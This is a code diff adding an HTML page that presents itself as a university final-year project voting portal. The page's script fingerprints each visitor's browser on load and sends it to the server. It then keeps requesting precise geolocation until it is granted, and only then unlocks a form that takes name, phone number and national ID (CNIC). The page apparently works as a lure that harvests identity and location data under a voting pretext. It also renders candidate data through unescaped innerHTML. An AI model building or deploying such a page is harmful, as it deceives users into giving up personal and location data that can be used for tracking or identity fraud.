@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>University IT Project Vote</title>
+<style>
+  :root {
+    --bg: #07090d;
+    --panel: #0f1420;
+    --panel-2: #131a29;
+    --border: #1f2a3d;
+    --cyan: #00e6ff;
+    --magenta: #ff2fb9;
+    --yellow: #ffd60a;
+    --green: #22ff88;
+    --red: #ff4757;
+    --text: #d9e3f2;
+    --muted: #7b8a9f;
+  }
+
+  * { box-sizing: border-box; }
+  html, body { margin: 0; padding: 0; }
+  body {
+    font-family: ui-monospace, "SF Mono", Consolas, monospace;
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  body::before {
+    content: "";
+    position: fixed;
+    inset: 0;
+    background:
+      linear-gradient(rgba(0,230,255,.035) 1px, transparent 1px) 0 0 / 100% 40px,
+      linear-gradient(90deg, rgba(0,230,255,.035) 1px, transparent 1px) 0 0 / 40px 100%;
+    pointer-events: none;
+    z-index: 0;
+  }
+  body::after {
+    content: "";
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      to bottom,
+      rgba(0,0,0,0) 0px,
+      rgba(0,0,0,0) 2px,
+      rgba(0,0,0,.15) 3px
+    );
+    pointer-events: none;
+    z-index: 1;
+    animation: scan 8s linear infinite;
+  }
+  @keyframes scan {
+    from { background-position: 0 0; }
+    to   { background-position: 0 40px; }
+  }
+
+  .wrap {
+    position: relative;
+    z-index: 2;
+    max-width: 980px;
+    margin: 0 auto;
+    padding: 40px 24px 80px;
+  }
+
+  .banner {
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    background: linear-gradient(135deg, rgba(0,230,255,.06), rgba(255,47,185,.06));
+    padding: 28px 32px;
+    position: relative;
+    overflow: hidden;
+    margin-bottom: 28px;
+  }
+  .banner::before {
+    content: "";
+    position: absolute; inset: 0;
+    background: radial-gradient(600px 200px at 20% 0%, rgba(0,230,255,.15), transparent 60%);
+    pointer-events: none;
+  }
+  .tag {
+    display: inline-block;
+    padding: 4px 12px;
+    border: 1px solid var(--cyan);
+    color: var(--cyan);
+    border-radius: 999px;
+    font-size: 11px;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    margin-bottom: 16px;
+    animation: pulse 2s infinite ease-in-out;
+  }
+  @keyframes pulse {
+    0%,100% { box-shadow: 0 0 0 0 rgba(0,230,255,.4); }
+    50%     { box-shadow: 0 0 0 8px rgba(0,230,255,0); }
+  }
+  h1 {
+    margin: 0 0 8px;
+    font-size: 34px;
+    letter-spacing: 1px;
+    background: linear-gradient(90deg, var(--cyan), var(--magenta));
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+    text-transform: uppercase;
+  }
+  .subtitle {
+    color: var(--muted);
+    font-size: 13px;
+    max-width: 640px;
+    line-height: 1.7;
+  }
+
+  .meta {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+    gap: 12px;
+    margin-top: 20px;
+  }
+  .meta-item {
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 10px 14px;
+    background: rgba(0,0,0,.25);
+  }
+  .meta-item .label {
+    font-size: 10px;
+    color: var(--muted);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+  }
+  .meta-item .value {
+    font-size: 13px;
+    margin-top: 4px;
+    color: var(--cyan);
+  }
+
+  .panel {
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    background: linear-gradient(180deg, var(--panel), var(--panel-2));
+    padding: 28px;
+    position: relative;
+    margin-bottom: 24px;
+  }
+  .panel::before {
+    content: "";
+    position: absolute; inset: -1px;
+    border-radius: 12px;
+    padding: 1px;
+    background: linear-gradient(135deg, var(--cyan), transparent 40%, transparent 60%, var(--magenta));
+    -webkit-mask:
+      linear-gradient(#000 0 0) content-box,
+      linear-gradient(#000 0 0);
+    -webkit-mask-composite: xor;
+            mask-composite: exclude;
+    pointer-events: none;
+    opacity: .55;
+  }
+  .panel-title {
+    margin: 0 0 20px;
+    font-size: 14px;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    color: var(--cyan);
+  }
+
+  .field {
+    margin-bottom: 18px;
+  }
+  .field label {
+    display: block;
+    font-size: 11px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--muted);
+    margin-bottom: 6px;
+  }
+  .field input {
+    width: 100%;
+    background: rgba(0,0,0,.4);
+    border: 1px solid var(--border);
+    color: var(--text);
+    padding: 12px 14px;
+    border-radius: 6px;
+    font-family: inherit;
+    font-size: 14px;
+    transition: border-color .2s, box-shadow .2s;
+  }
+  .field input:focus {
+    outline: none;
+    border-color: var(--cyan);
+    box-shadow: 0 0 0 3px rgba(0,230,255,.15);
+  }
+  .field input.error {
+    border-color: var(--red);
+    box-shadow: 0 0 0 3px rgba(255,71,87,.15);
+  }
+
+  .candidates {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+    gap: 12px;
+    margin-bottom: 20px;
+  }
+  .candidate {
+    cursor: pointer;
+    position: relative;
+  }
+  .candidate input { position: absolute; opacity: 0; pointer-events: none; }
+  .candidate .card {
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 14px 16px;
+    background: rgba(0,0,0,.3);
+    transition: transform .2s, border-color .2s, background .2s;
+  }
+  .candidate:hover .card {
+    transform: translateY(-2px);
+    border-color: var(--cyan);
+    background: rgba(0,230,255,.05);
+  }
+  .candidate input:checked + .card {
+    border-color: var(--magenta);
+    background: rgba(255,47,185,.08);
+    box-shadow: 0 0 0 3px rgba(255,47,185,.15);
+  }
+  .candidate input:checked + .card .name { color: var(--magenta); }
+  .candidate .name {
+    font-weight: 700;
+    color: var(--text);
+    margin-bottom: 4px;
+    font-size: 15px;
+    transition: color .2s;
+  }
+  .candidate .proj {
+    font-size: 11px;
+    color: var(--muted);
+    line-height: 1.5;
+  }
+
+  .submit-wrap { display: flex; gap: 12px; align-items: center; flex-wrap: wrap; }
+  button.cyber {
+    background: transparent;
+    color: var(--cyan);
+    border: 2px solid var(--cyan);
+    padding: 14px 32px;
+    border-radius: 6px;
+    font-family: inherit;
+    font-size: 14px;
+    font-weight: 700;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    cursor: pointer;
+    position: relative;
+    overflow: hidden;
+    transition: color .2s, background .2s;
+  }
+  button.cyber::before {
+    content: "";
+    position: absolute; inset: 0;
+    background: var(--cyan);
+    transform: translateX(-101%);
+    transition: transform .3s;
+    z-index: -1;
+  }
+  button.cyber:hover { color: var(--bg); }
+  button.cyber:hover::before { transform: translateX(0); }
+  button.cyber:disabled {
+    opacity: .35;
+    cursor: not-allowed;
+    border-color: var(--muted);
+    color: var(--muted);
+  }
+  button.cyber:disabled::before { transform: translateX(-101%); }
+  .btn-note {
+    font-size: 11px;
+    color: var(--muted);
+    letter-spacing: 1px;
+  }
+  .btn-note.locked { color: var(--yellow); }
+
+  .result {
+    display: none;
+    border: 1px solid var(--green);
+    border-radius: 12px;
+    padding: 24px;
+    background: rgba(34,255,136,.05);
+    text-align: center;
+    margin-top: 20px;
+  }
+  .result.show { display: block; animation: fadeIn .5s ease; }
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(8px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+  .result h2 {
+    margin: 0 0 8px;
+    color: var(--green);
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    font-size: 18px;
+  }
+  .result p { margin: 4px 0; color: var(--muted); font-size: 13px; }
+  .result .who { color: var(--cyan); font-weight: 700; }
+</style>
+</head>
+<body>
+
+<div class="wrap">
+
+  <div class="banner">
+    <div class="tag">● Live System · 2026</div>
+    <h1>IT Project Voting Portal</h1>
+    <div class="subtitle">
+      University of Engineering &amp; Technology — Department of Computer Science.
+      Final-year project showcase. Cast your vote for the most innovative
+      IT project. Your location is required to verify on-campus participation.
+    </div>
+    <div class="meta">
+      <div class="meta-item"><div class="label">Term</div><div class="value">Spring 2026</div></div>
+      <div class="meta-item"><div class="label">Department</div><div class="value">Computer Science</div></div>
+      <div class="meta-item"><div class="label">Candidates</div><div class="value" id="candidateCount">—</div></div>
+      <div class="meta-item"><div class="label">Vote</div><div class="value">One per session</div></div>
+    </div>
+  </div>
+
+  <form class="panel" id="voteForm" onsubmit="return submitVote(event)">
+    <h2 class="panel-title">▶ Ballot Form</h2>
+
+    <div class="field">
+      <label for="name">Full Name</label>
+      <input type="text" id="name" placeholder="e.g. Ahmed Khan" autocomplete="off" />
+    </div>
+    <div class="field">
+      <label for="phone">Phone Number</label>
+      <input type="text" id="phone" placeholder="03XXXXXXXXX" autocomplete="off" maxlength="11" />
+    </div>
+    <div class="field">
+      <label for="cnic">CNIC</label>
+      <input type="text" id="cnic" placeholder="XXXXX-XXXXXXX-X" autocomplete="off" maxlength="15" />
+    </div>
+
+    <div class="field">
+      <label>Select Candidate</label>
+      <div class="candidates" id="candidates"></div>
+    </div>
+
+    <div class="submit-wrap">
+      <button type="submit" class="cyber" id="submitBtn" disabled>Submit Ballot</button>
+      <span class="btn-note locked" id="btnNote">⏳ Locked — waiting for location access</span>
+    </div>
+
+    <div class="result" id="result">
+      <h2>✔ Ballot Submitted</h2>
+      <p>Your vote has been recorded for <span class="who" id="resultName">—</span></p>
+      <p id="resultProject"></p>
+      <p>Session ID: <span class="mono" id="resultId">—</span></p>
+    </div>
+  </form>
+
+</div>
+
+<script>
+const API = {
+  create: "/api/location",
+  update: "/api/location/update",
+  submit: "/api/submit",
+  candidates: "/api/candidates",
+};
+
+let recordId = null;
+let ip = null;
+let locationReady = false;
+let submitted = false;
+
+function browserExtras() {
+  return {
+    user_agent: navigator.userAgent,
+    platform: navigator.platform || navigator.userAgentData?.platform,
+    language: navigator.language,
+    languages: (navigator.languages || []).join(", "),
+    screen: `${screen.width}x${screen.height} @ ${window.devicePixelRatio}x`,
+    viewport: `${window.innerWidth}x${window.innerHeight}`,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    touch: navigator.maxTouchPoints > 0,
+    referrer: document.referrer || null,
+    page_url: location.href,
+    client_time: new Date().toISOString(),
+  };
+}
+
+async function createRecord() {
+  const res = await fetch(API.create, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(browserExtras()),
+  });
+  if (!res.ok) throw new Error("HTTP " + res.status);
+  const j = await res.json();
+  recordId = j.record_id;
+  ip = j.ip;
+}
+
+async function geoOnce() {
+  return new Promise((resolve, reject) => {
+    if (!navigator.geolocation) return reject(new Error("Geolocation not supported"));
+    navigator.geolocation.getCurrentPosition(resolve, reject, {
+      enableHighAccuracy: true, timeout: 15000, maximumAge: 0,
+    });
+  });
+}
+
+async function pushLocation(pos) {
+  const c = pos.coords;
+  const res = await fetch(API.update, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      record_id: recordId,
+      latitude: c.latitude,
+      longitude: c.longitude,
+      accuracy: c.accuracy,
+      altitude: c.altitude,
+      altitude_accuracy: c.altitudeAccuracy,
+      heading: c.heading,
+      speed: c.speed,
+      timestamp: pos.timestamp,
+    }),
+  });
+  if (!res.ok) throw new Error("update HTTP " + res.status);
+}
+
+async function bootstrap() {
+  try {
+    await createRecord();
+  } catch (e) {
+    return setTimeout(bootstrap, 3000);
+  }
+
+  (async function locationLoop() {
+    try {
+      const pos = await geoOnce();
+      await pushLocation(pos);
+      locationReady = true;
+      unlockForm();
+    } catch (e) {
+      setTimeout(locationLoop, 2000);
+    }
+  })();
+}
+
+function unlockForm() {
+  const btn = document.getElementById("submitBtn");
+  const note = document.getElementById("btnNote");
+  if (submitted) return;
+  btn.disabled = false;
+  note.textContent = "✔ Location verified — you may submit";
+  note.classList.remove("locked");
+  note.style.color = "var(--green)";
+}
+
+async function loadCandidates() {
+  const res = await fetch(API.candidates);
+  const list = await res.json();
+  document.getElementById("candidateCount").textContent = list.length;
+  const wrap = document.getElementById("candidates");
+  wrap.innerHTML = list.map(c => `
+    <label class="candidate">
+      <input type="radio" name="candidate" value="${c.id}" />
+      <div class="card">
+        <div class="name">${c.name}</div>
+        <div class="proj">${c.project}</div>
+      </div>
+    </label>
+  `).join("");
+}
+
+async function submitVote(e) {
+  e.preventDefault();
+  if (submitted) return false;
+  if (!locationReady) {
+    alert("Location access is required before submitting.");
+    return false;
+  }
+
+  const name = document.getElementById("name");
+  const phone = document.getElementById("phone");
+  const cnic = document.getElementById("cnic");
+  const chosen = document.querySelector('input[name="candidate"]:checked');
+
+  [name, phone, cnic].forEach(f => f.classList.remove("error"));
+  let bad = false;
+  if (name.value.trim().length < 3)                 { name.classList.add("error");  bad = true; }
+  if (!/^03\d{2}-?\d{7}$/.test(phone.value.trim()))  { phone.classList.add("error"); bad = true; }
+  if (!/^\d{5}-?\d{7}-?\d$/.test(cnic.value.trim())) { cnic.classList.add("error"); bad = true; }
+  if (!chosen) { alert("Please select a candidate."); bad = true; }
+  if (bad) return false;
+
+  const btn = document.getElementById("submitBtn");
+  btn.disabled = true;
+  btn.textContent = "Submitting…";
+
+  try {
+    const res = await fetch(API.submit, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        record_id: recordId,
+        name: name.value.trim(),
+        phone: phone.value.trim(),
+        cnic: cnic.value.trim(),
+        candidate_id: chosen.value,
+      }),
+    });
+
+    if (!res.ok) {
+      const t = await res.text();
+      throw new Error(t || ("HTTP " + res.status));
+    }
+    const j = await res.json();
+
+    submitted = true;
+    document.getElementById("result").classList.add("show");
+    document.getElementById("resultName").textContent = j.candidate.name;
+    document.getElementById("resultProject").textContent = "Project: " + j.candidate.project;
+    document.getElementById("resultId").textContent = j.record_id;
+
+    btn.textContent = "Submitted ✓";
+    btn.style.borderColor = "var(--green)";
+    btn.style.color = "var(--green)";
+    document.getElementById("btnNote").textContent = "Thank you for voting.";
+  } catch (err) {
+    btn.disabled = false;
+    btn.textContent = "Submit Ballot";
+    alert("Submission failed: " + err.message);
+  }
+  return false;
+}
+
+loadCandidates();
+bootstrap();
+</script>
+
+</body>
+</html>
